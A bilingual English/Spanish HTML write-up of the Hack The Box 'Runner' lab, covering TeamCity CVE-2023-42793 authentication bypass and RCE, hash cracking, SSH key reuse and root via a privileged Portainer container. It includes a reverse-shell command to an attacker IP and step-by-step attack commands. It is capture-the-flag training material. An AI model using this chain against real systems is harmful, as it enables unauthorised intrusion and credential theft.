@@ -1,0 +1,462 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>runner | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">runner</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-medium">medium</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+            <div id="content-en" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+                    <p><strong>Exploitation process:</strong> The target machine was running TeamCity version 2023.05.3, a CI/CD platform by JetBrains, which was vulnerable to CVE-2023-42793. This critical vulnerability consists of two separate security flaws: an authentication bypass allowing unauthenticated admin user creation, and a path traversal vulnerability leading to remote code execution.</p>
+                    
+                    <p>By exploiting the authentication bypass, I created an administrative account on the TeamCity instance. From there, I leveraged the RCE vulnerability to gain initial shell access as the <code>tcuser</code> within a Docker container. Inside the container, I discovered database credentials and SSH keys stored in TeamCity's data directory, which allowed me to escalate horizontally to the <code>john</code> user on the host system.</p>
+                    
+                    <p>After gaining SSH access, I discovered Portainer running locally on ports 9000 and 9443. Using credentials found earlier (<code>matthew:piper123</code>), I authenticated to Portainer and created a privileged Docker container with the host's root filesystem mounted. This container-based privilege escalation technique gave me full access to the host system's files, allowing me to read the root flag.</p>
+                    
+                    <p><strong>Technologies/Exploits:</strong> TeamCity authentication bypass and RCE (CVE-2023-42793), Docker container escape via Portainer misconfiguration, SSH key reuse, password hash cracking.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Initial Reconnaissance</h2>
+                <p>I begin with an <code>nmap</code> scan to identify open ports and services on the target machine:</p>
+                <p><img src="./media/image4.png" alt="Nmap scan results showing open ports including SSH on 22, HTTP on 80, and additional services on 8000 and 9443" /></p>
+
+                <p>The scan reveals several interesting services. Port 80 is running an HTTP server, and there appear to be additional services on higher ports. I add <code>runner.htb</code> to my <code>/etc/hosts</code> file to facilitate further enumeration.</p>
+
+                <h2>Web Enumeration - Discovering TeamCity</h2>
+                <p>Running <code>whatweb</code> against the target provides additional information about the web application:</p>
+                <pre><code class="language-plaintext">http://runner.htb/ [200 OK] Bootstrap, Country[RESERVED][ZZ], 
+Email[sales@runner.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], 
+IP[10.10.11.13], JQuery[3.5.1], PoweredBy[TeamCity!], Script, 
+Title[Runner - CI/CD Specialists], X-UA-Compatible[IE=edge], nginx[1.18.0]</code></pre>
+
+                <p>The output reveals that the application is powered by TeamCity, a CI/CD platform. I perform virtual host enumeration using <code>gobuster</code> and discover a subdomain:</p>
+                <pre><code class="language-bash">gobuster vhost -u http://runner.htb -w /path/to/wordlist</code></pre>
+
+                <p>The scan identifies <code>teamcity.runner.htb</code> returning a 401 status code. I add this to my <code>/etc/hosts</code> file and navigate to it in my browser.</p>
+
+                <h3>TeamCity Login Portal</h3>
+                <p>Accessing <code>teamcity.runner.htb</code> presents a login portal for TeamCity, a CI/CD software by JetBrains:</p>
+                <p><img src="./media/image5.png" alt="TeamCity login page showing version 2023.05.3 and authentication form" /></p>
+
+                <p>The login page displays the TeamCity version at the bottom. This is critical information for identifying potential vulnerabilities. TeamCity is a continuous integration and deployment platform available at <a href="https://www.jetbrains.com/teamcity/">https://www.jetbrains.com/teamcity/</a>.</p>
+
+                <h2>Vulnerability Research - CVE-2023-42793</h2>
+                <p>After identifying the TeamCity version, I search for known vulnerabilities and discover CVE-2023-42793, a critical unauthenticated remote code execution vulnerability: <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-42793">https://nvd.nist.gov/vuln/detail/CVE-2023-42793</a></p>
+
+                <p>This vulnerability has an interesting backstory. According to threat intelligence research, the advanced persistent threat (APT) group APT29 attempted to exploit this vulnerability in the wild before it was fully disclosed. Security researchers documented their activities in this analysis: <a href="https://www.fortinet.com/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793">TeamCity Intrusion Saga - APT29 Suspected Exploiting CVE-2023-42793</a></p>
+
+                <h3>Understanding the Vulnerability</h3>
+                <p>CVE-2023-42793 actually consists of two separate vulnerabilities that can be chained together:</p>
+                <ol>
+                    <li><strong>Authentication Bypass:</strong> An endpoint allows unauthenticated attackers to create administrative accounts</li>
+                    <li><strong>Path Traversal to RCE:</strong> Once authenticated, an attacker can exploit a path traversal vulnerability in file editing functionality to achieve remote code execution</li>
+                </ol>
+
+                <p>I locate a proof-of-concept exploit on GitHub: <a href="https://github.com/Zenmovie/CVE-2023-42793">https://github.com/Zenmovie/CVE-2023-42793</a></p>
+
+                <p>This repository contains two separate scripts:</p>
+                <ul>
+                    <li><code>CVE-2023-42793_admin.sh</code> - Creates an administrative user</li>
+                    <li><code>CVE-2023-42793_rce.sh</code> - Exploits the file editing endpoint for RCE</li>
+                </ul>
+
+                <h2>Initial Access - Creating an Admin Account</h2>
+                <p>I execute the first script to create an administrative user account:</p>
+                <pre><code class="language-bash">bash CVE-2023-42793_admin.sh http://teamcity.runner.htb 80</code></pre>
+
+                <p>The script successfully creates an admin account with the following credentials:</p>
+                <pre><code class="language-plaintext">login: Zenmovie
+password: Zenmovie</code></pre>
+
+                <p>With these credentials, I can now authenticate to the TeamCity interface and explore the application.</p>
+
+                <h3>TeamCity Investigation</h3>
+                <p>After logging in, I begin enumerating the TeamCity instance. I discover several user accounts configured in the system:</p>
+                <p><img src="./media/image7.png" alt="TeamCity users list showing john, matthew, and admin accounts" /></p>
+
+                <p>The identified users are:</p>
+                <ul>
+                    <li><code>john</code></li>
+                    <li><code>matthew</code></li>
+                    <li><code>admin</code></li>
+                </ul>
+
+                <p>While exploring the TeamCity configuration, I also find a public SSH key (<code>id_rsa.pub</code>). A public key alone isn't immediately useful, but it suggests that the corresponding private key might be stored somewhere within the system or container.</p>
+
+                <h2>Remote Code Execution</h2>
+                <p>With administrative access established, I attempt to use the RCE exploit from the same repository. However, I encounter issues with the original script - it only executes single commands and doesn't properly handle special characters, spaces, or command separators like <code>${IFS}</code>.</p>
+
+                <p>After testing different approaches, I find an alternative exploit that works more reliably: <a href="https://github.com/B4l3rI0n/CVE-2023-42793">https://github.com/B4l3rI0n/CVE-2023-42793</a></p>
+
+                <p>Using this improved exploit, I successfully obtain a reverse shell as the <code>tcuser</code> account. I set up a netcat listener:</p>
+                <pre><code class="language-bash">nc -lvnp 4444</code></pre>
+
+                <p>Then execute the exploit to send a reverse shell:</p>
+                <pre><code class="language-bash">python3 exploit.py -u http://teamcity.runner.htb -c "bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'"</code></pre>
+
+                <p>I receive the connection and now have shell access as <code>tcuser</code>.</p>
+
+                <h3>Container Discovery</h3>
+                <p>After gaining initial access, I perform basic enumeration:</p>
+                <pre><code class="language-bash">id
+sudo -l
+ls -la /home</code></pre>
+
+                <p>The results reveal some interesting findings:</p>
+                <ul>
+                    <li>No <code>sudo</code> permissions available</li>
+                    <li>The <code>/home</code> directory is empty</li>
+                    <li>The filesystem structure suggests I'm inside a Docker container</li>
+                </ul>
+
+                <p>This makes sense - TeamCity is often deployed in containerized environments.</p>
+
+                <h2>Credential Discovery</h2>
+                <p>I navigate to the TeamCity data directory to search for sensitive information:</p>
+                <pre><code class="language-bash">cd /data/teamcity_server/datadir/system
+ls -la</code></pre>
+
+                <p>Inside this directory, I find a log file named <code>buildserver.log</code> containing database operations. Examining this file reveals SQL INSERT statements with usernames and password hashes:</p>
+                <pre><code class="language-bash">cat buildserver.log | grep -i insert | grep -i password</code></pre>
+
+                <p>I extract the password hashes and identify them as bcrypt hashes (hash mode 3200 in hashcat). I save these to a file and attempt to crack them:</p>
+                <pre><code class="language-bash">hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt</code></pre>
+
+                <p>After some time, hashcat successfully cracks one of the hashes, revealing credentials for the user <code>matthew</code>:</p>
+                <pre><code class="language-plaintext">matthew:piper123</code></pre>
+
+                <h3>SSH Key Discovery</h3>
+                <p>Continuing my enumeration of the TeamCity data directory, I explore the SSH keys storage location:</p>
+                <pre><code class="language-bash">cd /data/teamcity_server/datadir/config/projects/AllProjects/pluginData/ssh_keys
+ls -la</code></pre>
+
+                <p>Here I discover a private SSH key. I copy this key to my attacking machine and set the appropriate permissions:</p>
+                <pre><code class="language-bash">chmod 600 id_rsa</code></pre>
+
+                <p>I attempt to use this key with the users I've identified. Testing against <code>john</code> proves successful:</p>
+                <pre><code class="language-bash">ssh -i id_rsa john@runner.htb</code></pre>
+
+                <p>The authentication succeeds, and I gain SSH access to the host system as <code>john</code>. From here, I can retrieve the user flag.</p>
+
+                <h2>Privilege Escalation - Portainer Discovery</h2>
+                <p>After establishing SSH access, I enumerate local services to identify potential privilege escalation vectors:</p>
+                <pre><code class="language-bash">ss -tuln</code></pre>
+
+                <p>The output reveals several services listening on localhost:</p>
+                <p><img src="./media/image1.png" alt="Output of ss command showing services listening on localhost including ports 9000 and 9443" /></p>
+
+                <p>Among these local services, I notice ports 9000 and 9443 (HTTPS). These are the default ports for Portainer, a Docker management interface. I set up an SSH tunnel to access these services:</p>
+                <pre><code class="language-bash">ssh -i id_rsa -L 9443:127.0.0.1:9443 john@runner.htb</code></pre>
+
+                <p>Now I can access the Portainer interface by navigating to <code>https://127.0.0.1:9443</code> in my browser.</p>
+
+                <h3>Portainer Authentication</h3>
+                <p>The Portainer interface presents a login page. I attempt to authenticate with the credentials I found earlier:</p>
+                <ul>
+                    <li><code>john:[password]</code> - Failed</li>
+                    <li><code>matthew:piper123</code> - Success!</li>
+                </ul>
+
+                <p>The credentials for <code>matthew</code> grant me access to the Portainer dashboard, where I can manage Docker containers on the host system.</p>
+
+                <h2>Privilege Escalation via Portainer</h2>
+                <p>With access to Portainer, I can create privileged containers with access to the host filesystem. I find a useful article explaining this technique: <a href="https://rioasmara.com/2021/08/15/use-portainer-for-privilege-escalation/">Use Portainer for Privilege Escalation</a></p>
+
+                <p>The article is from 2021, and the Portainer UI has changed slightly, but the core concept remains the same. The modern interface requires creating a volume before creating the container.</p>
+
+                <h3>Creating the Volume</h3>
+                <p>First, I create a Docker volume that will mount the host's root filesystem:</p>
+                <p><img src="./media/image2.png" alt="Portainer volume creation interface showing configuration to mount host root filesystem" /></p>
+
+                <p>The volume configuration specifies:</p>
+                <ul>
+                    <li><strong>Driver:</strong> local</li>
+                    <li><strong>Device:</strong> /</li>
+                    <li><strong>Type:</strong> bind</li>
+                </ul>
+
+                <h3>Creating the Privileged Container</h3>
+                <p>Next, I create a new container with the following configuration:</p>
+                <p><img src="./media/image3.png" alt="Portainer container creation showing configuration with alpine image and privileged mode enabled" /></p>
+
+                <p>Key settings for the container:</p>
+                <ul>
+                    <li><strong>Image:</strong> alpine (a lightweight Linux distribution)</li>
+                    <li><strong>Interactive & TTY:</strong> Enabled</li>
+                    <li><strong>Privileged mode:</strong> Enabled</li>
+                    <li><strong>Console:</strong> Interactive</li>
+                </ul>
+
+                <h3>Mounting the Volume</h3>
+                <p>In the volume mapping section, I attach the previously created volume to the container:</p>
+                <p><img src="./media/image6.png" alt="Volume mapping configuration in Portainer showing host root filesystem mounted to /mnt/root" /></p>
+
+                <p>The volume is mapped as follows:</p>
+                <ul>
+                    <li><strong>Container path:</strong> /mnt/root</li>
+                    <li><strong>Volume:</strong> The previously created volume pointing to the host's root filesystem</li>
+                </ul>
+
+                <p>After deploying the container, I can access its console through Portainer's web interface. From within this privileged container, the entire host filesystem is accessible at <code>/mnt/root</code>.</p>
+
+                <h3>Root Access</h3>
+                <p>I navigate to the root directory on the host system:</p>
+                <pre><code class="language-bash">cd /mnt/root/root
+ls -la</code></pre>
+
+                <p>From here, I have full read/write access to the host's root filesystem with elevated privileges. I can read the root flag and perform any other necessary actions.</p>
+
+                <p>This technique works because Portainer allows authenticated users to create privileged containers with arbitrary volume mounts. By mounting the host's root filesystem into a container running as root, I effectively gain root-level access to all files on the host system, bypassing normal access controls.</p>
+            </div>
+
+            <div id="content-es" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+                    <p><strong>Resumen del proceso:</strong> La máquina objetivo ejecutaba TeamCity versión 2023.05.3, una plataforma CI/CD de JetBrains, vulnerable a CVE-2023-42793. Esta vulnerabilidad crítica consiste en dos fallos de seguridad separados: un bypass de autenticación que permite la creación de usuarios administradores sin autenticación, y una vulnerabilidad de path traversal que conduce a ejecución remota de código.</p>
+                    
+                    <p>Explotando el bypass de autenticación, creé una cuenta administrativa en la instancia de TeamCity. Desde allí, aproveché la vulnerabilidad de RCE para obtener acceso inicial de shell como <code>tcuser</code> dentro de un contenedor Docker. Dentro del contenedor, descubrí credenciales de base de datos y claves SSH almacenadas en el directorio de datos de TeamCity, lo que me permitió escalar horizontalmente al usuario <code>john</code> en el sistema host.</p>
+                    
+                    <p>Tras conseguir acceso SSH, descubrí que Portainer se ejecutaba localmente en los puertos 9000 y 9443. Usando credenciales encontradas anteriormente (<code>matthew:piper123</code>), me autentiqué en Portainer y creé un contenedor Docker privilegiado con el sistema de archivos raíz del host montado. Esta técnica de escalada de privilegios basada en contenedores me dio acceso completo a los archivos del sistema host, permitiéndome leer la flag de root.</p>
+                    
+                    <p><strong>Tecnologías/Exploits:</strong> Bypass de autenticación y RCE en TeamCity (CVE-2023-42793), escape de contenedor Docker mediante mala configuración de Portainer, reutilización de claves SSH, crackeo de hashes de contraseñas.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo de <code>nmap</code> para identificar puertos abiertos y servicios en la máquina objetivo:</p>
+                <p><img src="./media/image4.png" alt="Resultados del escaneo de nmap mostrando puertos abiertos incluyendo SSH en el 22, HTTP en el 80, y servicios adicionales en 8000 y 9443" /></p>
+
+                <p>El escaneo revela varios servicios interesantes. El puerto 80 ejecuta un servidor HTTP, y parece haber servicios adicionales en puertos superiores. Añado <code>runner.htb</code> a mi archivo <code>/etc/hosts</code> para facilitar la enumeración posterior.</p>
+
+                <h2>Enumeración Web - Descubriendo TeamCity</h2>
+                <p>Ejecutando <code>whatweb</code> contra el objetivo proporciona información adicional sobre la aplicación web:</p>
+                <pre><code class="language-plaintext">http://runner.htb/ [200 OK] Bootstrap, Country[RESERVED][ZZ], 
+Email[sales@runner.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], 
+IP[10.10.11.13], JQuery[3.5.1], PoweredBy[TeamCity!], Script, 
+Title[Runner - CI/CD Specialists], X-UA-Compatible[IE=edge], nginx[1.18.0]</code></pre>
+
+                <p>La salida revela que la aplicación está impulsada por TeamCity, una plataforma CI/CD. Realizo enumeración de hosts virtuales usando <code>gobuster</code> y descubro un subdominio:</p>
+                <pre><code class="language-bash">gobuster vhost -u http://runner.htb -w /ruta/al/wordlist</code></pre>
+
+                <p>El escaneo identifica <code>teamcity.runner.htb</code> devolviendo un código de estado 401. Lo añado a mi archivo <code>/etc/hosts</code> y navego a él en mi navegador.</p>
+
+                <h3>Portal de Login de TeamCity</h3>
+                <p>Al acceder a <code>teamcity.runner.htb</code> aparece un portal de login para TeamCity, un software CI/CD de JetBrains:</p>
+                <p><img src="./media/image5.png" alt="Página de login de TeamCity mostrando la versión 2023.05.3 y el formulario de autenticación" /></p>
+
+                <p>La página de login muestra la versión de TeamCity en la parte inferior. Esta es información crítica para identificar vulnerabilidades potenciales. TeamCity es una plataforma de integración y despliegue continuo disponible en <a href="https://www.jetbrains.com/teamcity/">https://www.jetbrains.com/teamcity/</a>.</p>
+
+                <h2>Investigación de Vulnerabilidades - CVE-2023-42793</h2>
+                <p>Tras identificar la versión de TeamCity, busco vulnerabilidades conocidas y descubro CVE-2023-42793, una vulnerabilidad crítica de ejecución remota de código sin autenticación: <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-42793">https://nvd.nist.gov/vuln/detail/CVE-2023-42793</a></p>
+
+                <p>Esta vulnerabilidad tiene una historia interesante. Según investigación de inteligencia de amenazas, el grupo de amenaza persistente avanzada (APT) APT29 intentó explotar esta vulnerabilidad en la naturaleza antes de que fuera completamente divulgada. Los investigadores de seguridad documentaron sus actividades en este análisis: <a href="https://www.fortinet.com/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793">TeamCity Intrusion Saga - APT29 Suspected Exploiting CVE-2023-42793</a></p>
+
+                <h3>Entendiendo la Vulnerabilidad</h3>
+                <p>CVE-2023-42793 realmente consiste en dos vulnerabilidades separadas que pueden encadenarse:</p>
+                <ol>
+                    <li><strong>Bypass de Autenticación:</strong> Un endpoint permite a atacantes sin autenticación crear cuentas administrativas</li>
+                    <li><strong>Path Traversal a RCE:</strong> Una vez autenticado, un atacante puede explotar una vulnerabilidad de path traversal en la funcionalidad de edición de archivos para lograr ejecución remota de código</li>
+                </ol>
+
+                <p>Localizo una prueba de concepto del exploit en GitHub: <a href="https://github.com/Zenmovie/CVE-2023-42793">https://github.com/Zenmovie/CVE-2023-42793</a></p>
+
+                <p>Este repositorio contiene dos scripts separados:</p>
+                <ul>
+                    <li><code>CVE-2023-42793_admin.sh</code> - Crea un usuario administrativo</li>
+                    <li><code>CVE-2023-42793_rce.sh</code> - Explota el endpoint de edición de archivos para RCE</li>
+                </ul>
+
+                <h2>Acceso Inicial - Creando una Cuenta Admin</h2>
+                <p>Ejecuto el primer script para crear una cuenta de usuario administrativo:</p>
+                <pre><code class="language-bash">bash CVE-2023-42793_admin.sh http://teamcity.runner.htb 80</code></pre>
+
+                <p>El script crea exitosamente una cuenta admin con las siguientes credenciales:</p>
+                <pre><code class="language-plaintext">login: Zenmovie
+password: Zenmovie</code></pre>
+
+                <p>Con estas credenciales, ahora puedo autenticarme en la interfaz de TeamCity y explorar la aplicación.</p>
+
+                <h3>Investigación de TeamCity</h3>
+                <p>Tras iniciar sesión, comienzo enumerando la instancia de TeamCity. Descubro varias cuentas de usuario configuradas en el sistema:</p>
+                <p><img src="./media/image7.png" alt="Lista de usuarios de TeamCity mostrando las cuentas john, matthew y admin" /></p>
+
+                <p>Los usuarios identificados son:</p>
+                <ul>
+                    <li><code>john</code></li>
+                    <li><code>matthew</code></li>
+                    <li><code>admin</code></li>
+                </ul>
+
+                <p>Mientras exploro la configuración de TeamCity, también encuentro una clave SSH pública (<code>id_rsa.pub</code>). Una clave pública por sí sola no es inmediatamente útil, pero sugiere que la clave privada correspondiente podría estar almacenada en algún lugar dentro del sistema o contenedor.</p>
+
+                <h2>Ejecución Remota de Código</h2>
+                <p>Con acceso administrativo establecido, intento usar el exploit de RCE del mismo repositorio. Sin embargo, encuentro problemas con el script original - solo ejecuta comandos únicos y no maneja adecuadamente caracteres especiales, espacios o separadores de comandos como <code>${IFS}</code>.</p>
+
+                <p>Tras probar diferentes enfoques, encuentro un exploit alternativo que funciona de manera más fiable: <a href="https://github.com/B4l3rI0n/CVE-2023-42793">https://github.com/B4l3rI0n/CVE-2023-42793</a></p>
+
+                <p>Usando este exploit mejorado, consigo exitosamente una reverse shell como la cuenta <code>tcuser</code>. Configuro un listener de netcat:</p>
+                <pre><code class="language-bash">nc -lvnp 4444</code></pre>
+
+                <p>Luego ejecuto el exploit para enviar una reverse shell:</p>
+                <pre><code class="language-bash">python3 exploit.py -u http://teamcity.runner.htb -c "bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'"</code></pre>
+
+                <p>Recibo la conexión y ahora tengo acceso shell como <code>tcuser</code>.</p>
+
+                <h3>Descubrimiento del Contenedor</h3>
+                <p>Tras obtener acceso inicial, realizo enumeración básica:</p>
+                <pre><code class="language-bash">id
+sudo -l
+ls -la /home</code></pre>
+
+                <p>Los resultados revelan algunos hallazgos interesantes:</p>
+                <ul>
+                    <li>No hay permisos <code>sudo</code> disponibles</li>
+                    <li>El directorio <code>/home</code> está vacío</li>
+                    <li>La estructura del sistema de archivos sugiere que estoy dentro de un contenedor Docker</li>
+                </ul>
+
+                <p>Esto tiene sentido - TeamCity se despliega a menudo en entornos contenedorizados.</p>
+
+                <h2>Descubrimiento de Credenciales</h2>
+                <p>Navego al directorio de datos de TeamCity para buscar información sensible:</p>
+                <pre><code class="language-bash">cd /data/teamcity_server/datadir/system
+ls -la</code></pre>
+
+                <p>Dentro de este directorio, encuentro un archivo de log llamado <code>buildserver.log</code> conteniendo operaciones de base de datos. Al examinar este archivo revela sentencias SQL INSERT con nombres de usuario y hashes de contraseñas:</p>
+                <pre><code class="language-bash">cat buildserver.log | grep -i insert | grep -i password</code></pre>
+
+                <p>Extraigo los hashes de contraseñas y los identifico como hashes bcrypt (modo hash 3200 en hashcat). Los guardo en un archivo e intento crackearlos:</p>
+                <pre><code class="language-bash">hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt</code></pre>
+
+                <p>Tras algún tiempo, hashcat consigue crackear uno de los hashes, revelando credenciales para el usuario <code>matthew</code>:</p>
+                <pre><code class="language-plaintext">matthew:piper123</code></pre>
+
+                <h3>Descubrimiento de Clave SSH</h3>
+                <p>Continuando mi enumeración del directorio de datos de TeamCity, exploro la ubicación de almacenamiento de claves SSH:</p>
+                <pre><code class="language-bash">cd /data/teamcity_server/datadir/config/projects/AllProjects/pluginData/ssh_keys
+ls -la</code></pre>
+
+                <p>Aquí descubro una clave SSH privada. Copio esta clave a mi máquina atacante y establezco los permisos apropiados:</p>
+                <pre><code class="language-bash">chmod 600 id_rsa</code></pre>
+
+                <p>Intento usar esta clave con los usuarios que he identificado. Probar contra <code>john</code> resulta exitoso:</p>
+                <pre><code class="language-bash">ssh -i id_rsa john@runner.htb</code></pre>
+
+                <p>La autenticación tiene éxito, y obtengo acceso SSH al sistema host como <code>john</code>. Desde aquí, puedo recuperar la flag de usuario.</p>
+
+                <h2>Escalada de Privilegios - Descubrimiento de Portainer</h2>
+                <p>Tras establecer acceso SSH, enumero servicios locales para identificar vectores potenciales de escalada de privilegios:</p>
+                <pre><code class="language-bash">ss -tuln</code></pre>
+
+                <p>La salida revela varios servicios escuchando en localhost:</p>
+                <p><img src="./media/image1.png" alt="Salida del comando ss mostrando servicios escuchando en localhost incluyendo los puertos 9000 y 9443" /></p>
+
+                <p>Entre estos servicios locales, noto los puertos 9000 y 9443 (HTTPS). Estos son los puertos por defecto para Portainer, una interfaz de gestión de Docker. Configuro un túnel SSH para acceder a estos servicios:</p>
+                <pre><code class="language-bash">ssh -i id_rsa -L 9443:127.0.0.1:9443 john@runner.htb</code></pre>
+
+                <p>Ahora puedo acceder a la interfaz de Portainer navegando a <code>https://127.0.0.1:9443</code> en mi navegador.</p>
+
+                <h3>Autenticación en Portainer</h3>
+                <p>La interfaz de Portainer presenta una página de login. Intento autenticarme con las credenciales que encontré anteriormente:</p>
+                <ul>
+                    <li><code>john:[contraseña]</code> - Fallido</li>
+                    <li><code>matthew:piper123</code> - ¡Éxito!</li>
+                </ul>
+
+                <p>Las credenciales de <code>matthew</code> me otorgan acceso al panel de Portainer, donde puedo gestionar contenedores Docker en el sistema host.</p>
+
+                <h2>Escalada de Privilegios mediante Portainer</h2>
+                <p>Con acceso a Portainer, puedo crear contenedores privilegiados con acceso al sistema de archivos del host. Encuentro un artículo útil explicando esta técnica: <a href="https://rioasmara.com/2021/08/15/use-portainer-for-privilege-escalation/">Use Portainer for Privilege Escalation</a></p>
+
+                <p>El artículo es de 2021, y la interfaz de usuario de Portainer ha cambiado ligeramente, pero el concepto central sigue siendo el mismo. La interfaz moderna requiere crear un volumen antes de crear el contenedor.</p>
+
+                <h3>Creando el Volumen</h3>
+                <p>Primero, creo un volumen Docker que montará el sistema de archivos raíz del host:</p>
+                <p><img src="./media/image2.png" alt="Interfaz de creación de volumen en Portainer mostrando configuración para montar el sistema de archivos raíz del host" /></p>
+
+                <p>La configuración del volumen especifica:</p>
+                <ul>
+                    <li><strong>Driver:</strong> local</li>
+                    <li><strong>Device:</strong> /</li>
+                    <li><strong>Type:</strong> bind</li>
+                </ul>
+
+                <h3>Creando el Contenedor Privilegiado</h3>
+                <p>A continuación, creo un nuevo contenedor con la siguiente configuración:</p>
+                <p><img src="./media/image3.png" alt="Creación de contenedor en Portainer mostrando configuración con imagen alpine y modo privilegiado habilitado" /></p>
+
+                <p>Configuraciones clave para el contenedor:</p>
+                <ul>
+                    <li><strong>Imagen:</strong> alpine (una distribución Linux ligera)</li>
+                    <li><strong>Interactive & TTY:</strong> Habilitado</li>
+                    <li><strong>Modo privilegiado:</strong> Habilitado</li>
+                    <li><strong>Consola:</strong> Interactiva</li>
+                </ul>
+
+                <h3>Montando el Volumen</h3>
+                <p>En la sección de mapeo de volúmenes, adjunto el volumen previamente creado al contenedor:</p>
+                <p><img src="./media/image6.png" alt="Configuración de mapeo de volumen en Portainer mostrando el sistema de archivos raíz del host montado en /mnt/root" /></p>
+
+                <p>El volumen se mapea de la siguiente manera:</p>
+                <ul>
+                    <li><strong>Ruta del contenedor:</strong> /mnt/root</li>
+                    <li><strong>Volumen:</strong> El volumen previamente creado apuntando al sistema de archivos raíz del host</li>
+                </ul>
+
+                <p>Tras desplegar el contenedor, puedo acceder a su consola a través de la interfaz web de Portainer. Desde dentro de este contenedor privilegiado, todo el sistema de archivos del host es accesible en <code>/mnt/root</code>.</p>
+
+                <h3>Acceso Root</h3>
+                <p>Navego al directorio root en el sistema host:</p>
+                <pre><code class="language-bash">cd /mnt/root/root
+ls -la</code></pre>
+
+                <p>Desde aquí, tengo acceso completo de lectura/escritura al sistema de archivos raíz del host con privilegios elevados. Puedo leer la flag de root y realizar cualquier otra acción necesaria.</p>
+
+                <p>Esta técnica funciona porque Portainer permite a usuarios autenticados crear contenedores privilegiados con montajes de volumen arbitrarios. Al montar el sistema de archivos raíz del host en un contenedor ejecutándose como root, efectivamente obtengo acceso de nivel root a todos los archivos en el sistema host, evitando los controles de acceso normales.</p>
+            </div>
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
